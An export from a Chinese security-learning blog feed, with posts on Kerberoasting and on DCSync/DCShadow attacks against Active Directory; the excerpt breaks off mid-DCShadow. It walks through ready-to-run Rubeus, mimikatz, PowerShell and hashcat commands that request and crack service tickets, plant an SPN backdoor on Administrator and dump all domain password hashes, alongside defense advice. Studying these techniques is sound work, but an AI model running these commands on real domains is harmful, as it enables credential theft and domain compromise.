    <content type="html"><![CDATA[<h2 id="kerberosating攻击学习"><a href="#kerberosating攻击学习" class="headerlink" title="kerberosating攻击学习"></a>kerberosating攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin同时发布了 配套的攻击工具kerberoast。此后，不少研究人员对Ker beroasting进行了改进和扩展，在GitHub上开发发布了 大量工具，使得Kerberoasting逐渐发展成为域攻击的常用方法之一。</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="kerberos协议认证"><a href="#kerberos协议认证" class="headerlink" title="kerberos协议认证"></a>kerberos协议认证</h4><p>可以参考前面关于票据部分的讲解。</p><p>kerberos协议的认证授权过程，3次涉及使用<strong>不同账户的NTLM</strong>作为密钥加密数据。</p><ul><li>使用<strong>域用户</strong>的NTLM加密认证请求票据</li><li>KDC使用<strong>Krbtgt账号</strong>的NTLM加密认证后的票据TGT</li><li>KDC使用<strong>运行服务的服务账号</strong>的NTLM加密授权票据TGS</li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20200805123917.png" alt=""></p><p>​            当发布Windows 2000和Active Directory时，微软打算在 Windows NT 和Windows 95 上也支持Active Directory，这意味着不仅会产生各种各样的安全问题也会导致更多不安全的配置方式。同时，也意味着，微软要保证在多个不同版本的 Windows 客户端上均支持Kerberos协议。</p><p>​            要实现这个想法的一个简单的办法就是在Kerberos协议中使用<strong>RC4加密算法</strong>·，并将<strong>NTLM密码哈希</strong>作为该加密算法的私钥，该私钥可用于加密或签名Kerberos票证。因此，对于攻击者来说，一旦发现了 NTLM 密码哈希，就可以随意使用，包括重新拿回Active Directory域权限（比如：黄金票证和白银票证攻击）。</p><h4 id="SPN（ServicePrincipal-Names-服务主体名称"><a href="#SPN（ServicePrincipal-Names-服务主体名称" class="headerlink" title="SPN（ServicePrincipal Names)服务主体名称"></a>SPN（ServicePrincipal Names)服务主体名称</h4><p>官方文档：</p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</a></p><p>全称<code>Service Principal Names</code></p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN。</p><p>SPN分为两种，一种注册在<strong>AD上机器帐户(Computers)</strong>下，另一种注册在<strong>域用户帐户(Users)</strong>下</p><p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p><p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><p><strong>SPN的格式</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass<span class="regexp">/host:port/</span>servicename</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li><li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li><li>如果服务运行在默认端口上，则端口号(port)可以省略</li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20200805125050.png" alt=""></p><p><strong>查询SPN</strong></p><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测。</p><h6 id="1-使用SetSPN"><a href="#1-使用SetSPN" class="headerlink" title="(1) 使用SetSPN"></a>(1) 使用SetSPN</h6><p>Win7和Windows Server2008自带的工具</p><p>查看当前域内的所有SPN：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>查看test域内的所有SPN：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -T test -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><h4 id="简述Kerberosating攻击"><a href="#简述Kerberosating攻击" class="headerlink" title="简述Kerberosating攻击"></a>简述Kerberosating攻击</h4><p>Kerberos使用公开的对称加密算法</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">y</span> = f (<span class="symbol">x</span>,key)</span><br></pre></td></tr></table></figure><ul><li>F为已知的对称加密算法 ，如<strong>RC4-HMAC</strong></li><li>x为待加密的数据，包含时间戳，其他为固定格式的内容, </li><li>key为加密密钥，即NTLM</li><li>y为加密后的数据</li></ul><p>如果能从Kerberos域网络中获取y,则根据已知算法f，使用不同的f可推算出不同的x。 由于x中包含简单易辨的时间戳，所以通过时间戳可快速判定数据解密是否正确，从而判定使用的是否为要寻找的口令.</p><h5 id="选择SPN服务账号的原因"><a href="#选择SPN服务账号的原因" class="headerlink" title="选择SPN服务账号的原因"></a>选择SPN服务账号的原因</h5><p>在域内主要有<strong>主机账号</strong>、<strong>用户账号</strong>、<strong>服务账号</strong>等3种主要账号类型 </p><ul><li>主机账号的口令由系统随机设置，几乎不能破解，而且每30天自动变更一次用户账号的口令复杂度由策略而定，在复杂度要求较高的域内，破解难度较大。</li><li>服务账号的口令存在很大的特殊性，口令在应用软件安装时往往自动设定，复杂度往往较为简单口令几乎不会更改，因为大部分应用软件没有提供修改服务账号的功能和接口，例如运行MS SQL Server 服务的sqlsvc账号等</li><li>SPN存在于账号的属性中，因此可以通过查询所有账号的属性，遍历域内所有SPN服务。因为主机账号的口 令几乎不能破解，所以只查询用户账号的SPN。</li></ul><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><ul><li><p>查询SPN，找到有价值的SPN</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul></li><li><p>请求服务票据(tgs)</p></li><li><p>导出服务票据(tgs)</p></li><li><p>重写服务票据&amp;RAM注入</p></li></ul><h5 id="实现Kerberoasting攻击的前提"><a href="#实现Kerberoasting攻击的前提" class="headerlink" title="实现Kerberoasting攻击的前提"></a>实现Kerberoasting攻击的前提</h5><ul><li>对于kerberos协议认证过程中返回的tgs_reply，在已知加密算法的前提下，我们可以尝试穷举口令。(<strong>服务密码一般默认为弱密码</strong>)</li><li>Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</li><li>域内的主机都能查询SPN。</li><li>域内的任何用户都可以向域内的任何服务请求TGS。</li></ul><h4 id="Kerberoasting攻击的利用"><a href="#Kerberoasting攻击的利用" class="headerlink" title="Kerberoasting攻击的利用"></a>Kerberoasting攻击的利用</h4><h5 id="使用-Rubeus工具"><a href="#使用-Rubeus工具" class="headerlink" title="使用 Rubeus工具"></a>使用 Rubeus工具</h5><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p><p>这是一个专门针对Kerberos的工具包，这个编译好像比较费事。。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Rubeus&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"> ______        _</span><br><span class="line">(_____ \      |<span class="string"> </span>|</span><br><span class="line"> _____) )_   _|<span class="string"> </span>|<span class="string">__  _____ _   _  ___</span></span><br><span class="line">|<span class="string">  __  /</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \</span>|<span class="string"> ___ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/___)</span></span><br><span class="line">|<span class="string"> </span>|<span class="string">  \ \</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_) ) ____</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">___ </span>|</span><br><span class="line">|<span class="string">_</span>|<span class="string">   </span>|<span class="string">_</span>|<span class="string">____/</span>|<span class="string">____/</span>|<span class="string">_____)____/(___/</span></span><br><span class="line"></span><br><span class="line"><span class="string">v1.5.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] Action: Kerberoasting</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : zeo</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=harmj0y,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : asdf/asdfasdf</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$zeolab.local$asdf/asdfasdf*$AE5F019D4CDED6CD74830CC......</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : sqlservice</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=SQL,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : MSSQLSvc/SQL.zeolab.local</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.zeolab.local*$E2B3869290......</span></span><br></pre></td></tr></table></figure><p>将哈希保存为hash.txt文件，放到hashcat的目录下。使用命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p>离线破解服务票据</p><h5 id="1、获得有价值的SPN"><a href="#1、获得有价值的SPN" class="headerlink" title="1、获得有价值的SPN"></a>1、获得有价值的SPN</h5><p>需要满足以下条件：</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul><p>可以选择以下三种方法：</p><h5 id="1-使用powershell模块Active-Directory"><a href="#1-使用powershell模块Active-Directory" class="headerlink" title="(1)使用powershell模块Active Directory"></a>(1)使用powershell模块Active Directory</h5><p><strong>注：</strong>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">import-module </span><span class="string">ActiveDirectory</span></span><br><span class="line"><span class="string">get-</span><span class="string">aduser </span>-<span class="string">filter </span>&#123;<span class="string">AdminCount </span>-<span class="string">eq </span>1 -<span class="string">and </span>(<span class="string">servicePrincipalName </span>-<span class="string">ne </span>0)&#125; -<span class="string">prop </span>* |<span class="string">select </span><span class="string">name,</span><span class="string">whencreated,</span><span class="string">pwdlastset,</span><span class="string">lastlogon</span></span><br></pre></td></tr></table></figure><p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-<span class="keyword">module</span> .\<span class="module-access"><span class="module"><span class="identifier">Microsoft</span>.</span><span class="module"><span class="identifier">ActiveDirectory</span>.</span><span class="module"><span class="identifier">Management</span>.</span></span>dll</span><br></pre></td></tr></table></figure><p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p><p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p><h4 id="2-使用PowerView"><a href="#2-使用PowerView" class="headerlink" title="(2)使用PowerView"></a>(2)使用PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure><h4 id="3-使用kerberoast"><a href="#3-使用kerberoast" class="headerlink" title="(3)使用kerberoast"></a>(3)使用kerberoast</h4><p>powershell:</p><p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p><p>vbs:</p><p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p><p>参数如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript <span class="module-access"><span class="module"><span class="identifier">GetUserSPNs</span>.</span></span>vbs</span><br></pre></td></tr></table></figure><h3 id="2、请求TGS"><a href="#2、请求TGS" class="headerlink" title="2、请求TGS"></a>2、请求TGS</h3><h4 id="1-请求指定TGS"><a href="#1-请求指定TGS" class="headerlink" title="(1)请求指定TGS"></a>(1)请求指定TGS</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SPNName</span> = <span class="string">'MSSQLSvc/DC1.test.com'</span></span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System<span class="selector-class">.IdentityModel</span><span class="selector-class">.Tokens</span><span class="selector-class">.KerberosRequestorSecurityToken</span> -ArgumentList <span class="variable">$SPNName</span></span><br></pre></td></tr></table></figure><h4 id="2-请求所有TGS"><a href="#2-请求所有TGS" class="headerlink" title="(2)请求所有TGS"></a>(2)请求所有TGS</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Add</span>-<span class="keyword">Type</span> -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | <span class="type">Select</span>-String '^CN' -<span class="keyword">Context</span> <span class="number">0</span>,<span class="number">1</span> | <span class="type">% &#123; New</span>-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $<span class="keyword">_</span>.<span class="keyword">Context</span>.PostContext[<span class="number">0</span>].Trim() &#125;</span><br></pre></td></tr></table></figure><p>执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS</p><h3 id="3、导出"><a href="#3、导出" class="headerlink" title="3、导出"></a>3、导出</h3><p>使用mimikatz</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::<span class="built_in">list</span> /<span class="keyword">export</span></span><br></pre></td></tr></table></figure><h3 id="4、破解"><a href="#4、破解" class="headerlink" title="4、破解"></a>4、破解</h3><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tgsrepcrack<span class="selector-class">.py</span> wordlist<span class="selector-class">.txt</span> test.kirbi</span><br></pre></td></tr></table></figure><h2 id="0x05-Kerberoasting的实现方法二"><a href="#0x05-Kerberoasting的实现方法二" class="headerlink" title="0x05 Kerberoasting的实现方法二"></a>0x05 Kerberoasting的实现方法二</h2><hr><p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p><p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p><p>代码地址：</p><p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p><p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p><p>实例演示：</p><p>在域内一台主机上以普通用户权限执行：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat <span class="string">| fl</span></span><br></pre></td></tr></table></figure><p>-AdminCount表示选择高权限的用户</p><p>输出结果如下图</p><p><img src="2-2.png" alt="Alt text"></p><p>只提取出hash的参数如下：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | <span class="type">Select</span> hash | <span class="type">ConvertTo</span>-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure><p>输出结果如下图</p><p><img src="2-3.png" alt="Alt text"></p><p>使用hashcat破解的参数如下：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 <span class="string">/tmp/hash.txt</span> <span class="string">/tmp/password.list</span> -o found.txt <span class="params">--force</span></span><br></pre></td></tr></table></figure><p>破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p><p><img src="2-4.png" alt="Alt text"></p><p><strong>注：</strong></p><p>Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：</p><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p><p>参数如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure><h2 id="0x06-Kerberoasting的后门利用"><a href="#0x06-Kerberoasting的后门利用" class="headerlink" title="0x06 Kerberoasting的后门利用"></a>0x06 Kerberoasting的后门利用</h2><hr><p>在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p><p>例如为域用户<code>Administrator</code>添加<code>SPNVNC/DC1.test.com</code>，参数如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -U -A VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure><p>如下图</p><p><img src="3-1.png" alt="Alt text"></p><p>在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图</p><p><img src="3-2.png" alt="Alt text"></p><p>再使用hashcat破解即可</p><p><strong>补充：</strong></p><p>删除SPN的参数如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -D VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure><h2 id="0x07-防御"><a href="#0x07-防御" class="headerlink" title="0x07 防御"></a>0x07 防御</h2><hr><p>Kerberoasting攻击的主要前提是口令复杂度较低、 加密算法强度较弱</p><p>对抗Kerberoasting攻击也需从这2方面开展:</p><ul><li>提高服务账号的口令复杂度；</li><li>尽量将域内的服务器系统升级至少至Windows 2008 系统，应用AES256高难度的加密算法.</li></ul><p>管理员可在域内一台主机上使用Invoke-Kerberoast检查是否存在危险的SPN</p><p>下载地址：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><p>参数：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;kerberosating攻击学习&quot;&gt;&lt;a href=&quot;#kerberosating攻击学习&quot; class=&quot;headerlink&quot; title=&quot;kerberosating攻击学习&quot;&gt;&lt;/a&gt;kerberosating攻击学习&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>DCSync与DCshadow攻击学习</title>
    <link href="https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/</id>
    <published>2020-08-05T09:03:28.000Z</published>
    <updated>2020-11-25T09:10:57.289Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DCSync与DCshadow攻击学习"><a href="#DCSync与DCshadow攻击学习" class="headerlink" title="DCSync与DCshadow攻击学习"></a>DCSync与DCshadow攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>DCSync与DCshadow是域渗透中经常会用到的技术。</p><h3 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h3><p>​    2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。</p><p>​    DCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。</p><p>​    DCSync 的最大特点，在于不用登录域服务器，即可远程通过<strong>域数据同步复制</strong>的方式获得想要的用户口令信息。</p><p>​    需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC是不能参与复制同步数据</p><h4 id="DCSync攻击原理"><a href="#DCSync攻击原理" class="headerlink" title="DCSync攻击原理"></a>DCSync攻击原理</h4><p>DCSync 的原理非常清晰，利用<strong>域控制器之间的数据同步复制</strong>。</p><ul><li>发现网络中的目标域控制器;</li><li>通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol</li></ul><p>Samba wiki 关于 GetNCChanges 的描述包括:</p><p>​    当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。</p><p>如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p><h5 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h5><p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</a></p><h4 id="DCSync攻击前提"><a href="#DCSync攻击前提" class="headerlink" title="DCSync攻击前提"></a>DCSync攻击前提</h4><p>一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>即：默认情况下域管理员组具有该权限。</p><p><img src="20200507093022.png-water_print" alt="img"></p><p><img src="20200507093039.png-water_print" alt="img"></p><h4 id="DCSync攻击利用"><a href="#DCSync攻击利用" class="headerlink" title="DCSync攻击利用"></a>DCSync攻击利用</h4><h5 id="1-使用mimikatz"><a href="#1-使用mimikatz" class="headerlink" title="1.使用mimikatz"></a>1.使用mimikatz</h5><p>导出域内所有用户的hash：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:test.com /all /csv"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><img src="20200507093111.png-water_print" alt="img"></p><p>导出域内administrator帐户的hash：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:test.com /user:administrator /csv"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><h5 id="2-powershell实现"><a href="#2-powershell实现" class="headerlink" title="2.powershell实现"></a>2.powershell实现</h5><p><a href="https://gist.github.com/monoxgas/9d238accd969550136db" target="_blank" rel="noopener">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><p>通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能</p><p>导出域内所有用户的hash：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DCSync -DumpForest <span class="string">| ft -wrap -autosize</span></span><br></pre></td></tr></table></figure><p>导出域内administrator帐户的hash：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DCSync -DumpForest -Users @(<span class="string">"administrator"</span>) | ft -<span class="keyword">wrap</span> -<span class="keyword">a</span></span><br></pre></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/domain:rd.adsecurity.org /</span><span class="string">user:</span>Administrator</span><br></pre></td></tr></table></figure><h4 id="DCSync防御"><a href="#DCSync防御" class="headerlink" title="DCSync防御"></a>DCSync防御</h4><p>DCSync 攻击的原理是模拟域控制器发起服务器之间的数据同步复制。</p><p>最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步</p><p>获取域内所有IP的脚本:</p><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PowerShell:<span class="built_in">Get-ADDomainController</span> <span class="literal">-filter</span> * | select IPv4Address</span><br><span class="line">或</span><br><span class="line">[<span class="type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain().DomainControllers | select IPAddress</span><br></pre></td></tr></table></figure><p>在网络设备上检测来自白名单以外的域控制器数据同步复制</p><h3 id="DCShadow-攻击"><a href="#DCShadow-攻击" class="headerlink" title="DCShadow 攻击"></a>DCShadow 攻击</h3><p>2018年1月24日，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 在 BlueHat IL 会议期间公布了针对域活动目录的一种新型攻击技术 <code>DCShadow</code></p><p>在<strong>具备域管理员权限条件</strong>下，攻击者可以<strong>创建伪造的域控制器</strong>，将预先设定的对象或对象属性复制到正在运行域服务器中。</p><p>DCSync 从域服务器复制出东西，DCShadow 是将数据复制至域服务器。</p><p>Luc Delsalle 对这种技术进行了验证和详细的描述，并就红蓝对抗中蓝队对抗此种攻击技术的缺陷和补救方法。</p><p>从 DCShadow 目前展示的功能来看，主要只能用于红蓝对抗的隐蔽后门。但是 DCShadow 第一次澄清和实现了伪造一个 DC 的最小需求合集，这个贡献非常大。以 前很多攻击方法都卡在不能伪造域服务器，例如 MS15-011 和 MS15-014 等，有了 <code>DCShadow</code> 的基础，相信将来会有很多新的攻击方法。</p><h4 id="DCShadow-攻击流程"><a href="#DCShadow-攻击流程" class="headerlink" title="DCShadow 攻击流程"></a>DCShadow 攻击流程</h4><p>根据 Luc Delsalle 的描述，DCShadow 的攻击过程包括 3 个主要个步骤:</p><p>1、在目标域的 AD 活动目录注册一个伪造的 DC 中;</p><p>2、使伪造的 DC 被其他的 DC 认可，能够参与域复制 ;</p><p>3、强制触发域复制，将指定的新对象或修改后的对象属性同步复制到其他 DC 中;</p><h4 id="注册伪造的DC"><a href="#注册伪造的DC" class="headerlink" title="注册伪造的DC"></a>注册伪造的DC</h4><p>一台机器要想注册成为域中的一台 DC 服务器，需要在域的活动目录中注册一个 <code>NTDS-DSA(nTDSDSA)</code>类对象。注册的位置为 <code>CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com</code></p><p><img src="20200507100302.png-water_print" alt="img"></p><p>adsec.com 域有 3 台域服务器，分别是 LABDC01、RESDC01 及 WIN2016-DC01，标红的正是我们实验环境的域服务器。我们测试的机器为 Win7X86cn04，测试成功的则会生成一个新的NTDS-DSA(nTDSDSA)类对象</p><p><img 